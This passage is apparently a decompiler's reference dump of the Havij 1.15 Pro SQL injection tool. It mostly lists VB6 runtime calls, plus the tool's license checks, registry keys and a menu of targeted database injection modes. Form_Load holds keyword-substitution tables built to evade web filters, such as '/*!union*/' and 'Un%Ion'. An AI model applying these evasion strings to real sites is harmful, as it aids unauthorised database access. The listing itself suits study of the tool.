'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub Command1_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "All Files (*.*)|*.*"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
End Sub
 
Sub Command2_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "All Files (*.*)|*.*"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
End Sub
 
Sub Command3_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Trim(
'N  * ref: LCase(
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstEq
'N  * ref: "Checking license validation..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: Subr_147
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaVarCat
'N  * ref: "License validation failed (code 0"
'N  * ref: ")"
'N  * ref: Subr_143
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: "Registered"
'N  * ref: "Software\Havij\Registration"
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaVarDup
'N  * ref: "License is valid"
'N  * ref: Subr_143
'N  * ref: "Successfully Registered"
'N  * ref: MsgBox
'N  * ref: "Registration Failed (code 0"
'N  * ref: ")"
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarCat
'N  * ref: MsgBox
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
End Sub
 
Sub Command4_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "*.*"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
End Sub
 
Sub delRow_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarDup
'N  * ref: "|"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: "|"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: Left(
'N  * ref: "."
'N  * ref: ".."
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "DELETE from "
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: IIf(
'N  * ref: " where "
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: IsNumeric(
'N  * ref: IsNumeric(
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: " IS NULL"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "'"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "'"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: " and "
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub editrow_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
End Sub
 
Sub Form_Activate()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: "Havij 1.15 Pro"
'N  * ref: __vbaLenBstr
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Havij 1.15 Pro"
'N  * ref: __vbaVarDup
'N  * ref: Right(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "66389"
'N  * ref: "eYULNWDVdqW@ZRedSTQJBDRLPYX"
'N  * ref: Subr_750
'N  * ref: "66389"
'N  * ref: "dSTQJBSA]]"
'N  * ref: Subr_750
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "1"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: __vbaEnd
'N  * ref: "66389"
'N  * ref: "eYULNWDVdqW@ZRedSTQJBDRLPYX"
'N  * ref: Subr_750
'N  * ref: "66389"
'N  * ref: "xW^]"
'N  * ref: Subr_750
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_744
'N  * ref: Subr_745
'N  * ref: "Registered"
'N  * ref: __vbaStrCat
'N  * ref: Subr_752
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "66389"
'N  * ref: "eYULNWDVdqW@ZRedSTQJBDRLPYX"
'N  * ref: Subr_750
'N  * ref: "66389"
'N  * ref: "dST~PZS"
'N  * ref: Subr_750
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "Havij 1.15 Pro"
'N  * ref: "!"
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarMove
'N  * ref: "s"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarForNext
'N  * ref: Mid(
'N  * ref: Subr_143
'N  * ref: Subr_182
'N  * ref: __vbaFreeVar
'N  * ref: Command$
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: """"
'N  * ref: Replace(
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaEnd
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub Form_Click()
'N  * ref: __vbaExceptHandler
End Sub
 
Sub Form_Initialize()
'N  * ref: __vbaExceptHandler
'N  * ref: Subr_132
End Sub
 
Sub Form_Load()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaUI1I2
'N  * ref: __vbaStrCopy
'N  * ref: Subr_170
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * API ref: SendMessageA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * API ref: SendMessageA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: "Page"
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: "Response"
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: "Site"
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: "Pass"
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaR4Var
'N  * ref: "DB"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MsSQL with error"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MsSQL no error"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MsSQL Blind"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MsSQL time based"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MsAccess"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MsAccess Blind"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MySQL"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MySQL error based"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MySQL Blind"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "MySQL time based"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "Oracle"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "Oracle error based"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "PostgreSQL"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaVarDup
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: LCase(
'N  * ref: "havij"
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaEnd
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\"
'N  * ref: __vbaStrCat
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "Tables.txt"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\"
'N  * ref: __vbaStrCat
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "Columns.txt"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaRedim
'N  * ref: Array(
'N  * ref: __vbaErase
'N  * ref: __vbaVarMove
'N  * ref: __vbaRedim
'N  * ref: "select::/*!select*/"
'N  * ref: __vbaVarCopy
'N  * ref: "union::/*!union*/"
'N  * ref: __vbaVarCopy
'N  * ref: "from::/*!from*/"
'N  * ref: __vbaVarCopy
'N  * ref: "where::/*!where*/"
'N  * ref: __vbaVarCopy
'N  * ref: "and::/*!and*/"
'N  * ref: __vbaVarCopy
'N  * ref: "or::/*!or*/"
'N  * ref: __vbaVarCopy
'N  * ref: "information_schema::/*!information_schema*/"
'N  * ref: __vbaVarCopy
'N  * ref: Array(
'N  * ref: __vbaErase
'N  * ref: __vbaVarMove
'N  * ref: __vbaRedim
'N  * ref: "select::sE%leCt"
'N  * ref: __vbaVarCopy
'N  * ref: "convert::cOn%vErt"
'N  * ref: __vbaVarCopy
'N  * ref: "union::Un%Ion"
'N  * ref: __vbaVarCopy
'N  * ref: "where::w%HeRe"
'N  * ref: __vbaVarCopy
'N  * ref: "from::fr%Om"
'N  * ref: __vbaVarCopy
'N  * ref: "information_schema::inFor%mation_sc%hEma"
'N  * ref: __vbaVarCopy
'N  * ref: "char::c%Har"
'N  * ref: __vbaVarCopy
'N  * ref: "cast::ca%st"
'N  * ref: __vbaVarCopy
'N  * ref: "table::tab%le"
'N  * ref: __vbaVarCopy
'N  * ref: "count::co%unt"
'N  * ref: __vbaVarCopy
'N  * ref: "order::o%rder"
'N  * ref: __vbaVarCopy
'N  * ref: "and::a%nd"
'N  * ref: __vbaVarCopy
'N  * ref: " or :: o%r "
'N  * ref: __vbaVarCopy
'N  * ref: "isnull::isn%ull"
'N  * ref: __vbaVarCopy
'N  * ref: "top::t%op"
'N  * ref: __vbaVarCopy
'N  * ref: "distinct::dis%tinct"
'N  * ref: __vbaVarCopy
'N  * ref: "db_name::db_na%me"
'N  * ref: __vbaVarCopy
'N  * ref: "--::-%-"
'N  * ref: __vbaVarCopy
'N  * ref: Array(
'N  * ref: __vbaErase
'N  * ref: __vbaVarMove
'N  * ref: __vbaUI1I2
'N  * ref: __vbaUI1I2
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: LCase(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "http://itsecteam.com"
'N  * ref: __vbaStrCopy
'N  * ref: Date
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaStrDate
'N  * ref: __vbaStrMove
'N  * ref: DateValue(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "Date"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "Registered"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCopy
'N  * ref: "Name"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: Subr_744
'N  * ref: __vbaStrMove
'N  * ref: Subr_745
'N  * ref: __vbaStrMove
'N  * ref: "Registered"
'N  * ref: __vbaStrCat
'N  * ref: Subr_752
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "RegFile"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaOnError
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: Date
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaStrDate
'N  * ref: __vbaStrMove
'N  * ref: DateValue(
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: Date
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaStrDate
'N  * ref: __vbaStrMove
'N  * ref: DateValue(
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarCmpLe
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
